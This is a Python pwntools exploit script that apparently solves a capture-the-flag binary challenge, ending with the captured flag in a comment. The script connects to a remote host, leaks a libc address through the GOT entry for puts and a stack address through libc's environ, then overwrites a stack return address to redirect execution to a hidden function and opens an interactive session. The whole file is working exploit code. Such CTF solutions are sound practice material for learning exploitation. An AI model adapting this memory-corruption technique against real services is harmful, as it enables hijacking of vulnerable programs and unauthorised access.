#!/usr/bin/python3

from pwn import *


filename = "./chall"

#io = process(filename)
io = remote("139.59.176.252", 31342)
elf = ELF(filename)
libc = ELF("./libc.so.6")

context.clear(arch="amd64")

def recycle(first=True):
	io.sendlineafter("> ","2")
	io.sendlineafter("> ", "1")

	if first:
		io.sendlineafter("> ", "n")
	else:
		io.sendlineafter("> ", "y")

def leak_libc_base_address(data):
	for _ in range(0, 10):
		recycle(first=True)
	io.sendlineafter("> ", str(data))
	leaked_address  = u64(io.recvline().strip(b"b'\x1b[0m").strip().decode("latin-1").ljust(8, "\x00"))
	log.info("Leaked address: %s "  % hex(leaked_address))
	base_address = leaked_address - libc.sym.puts
	log.info("Base address: %s " % hex(base_address))
	return base_address

def stack_address(data):
	recycle(first=False)
	io.sendlineafter("> ", str(data))
	leaked_address = u64(io.recvline().strip(b"b'\x1b[0m").strip().decode("latin-1").ljust(8, "\x00"))
	log.info("Leaked address: %s " % hex(leaked_address))
	return leaked_address


def plant(store, value):
	io.sendlineafter("> ", "1")
	io.sendlineafter("> ", str(store))
	io.sendlineafter("> ", str(value))

def main():
	base_address = leak_libc_base_address(elf.got.puts) # Leak the address at got 
	environ = base_address + libc.sym.environ
	log.info("Environ: %s "  % hex(environ))

	leaked_address = stack_address(environ) # The the address @ environ to get the stack address.

	plant_ret_address = leaked_address - 0xf0 - 48 
	plant(plant_ret_address, elf.sym.hidden_resources) # final overwrite
	io.interactive()

if __name__ == "__main__":
	main()

# CHTB{u_s4v3d_th3_3nv1r0n_v4r14bl3!}
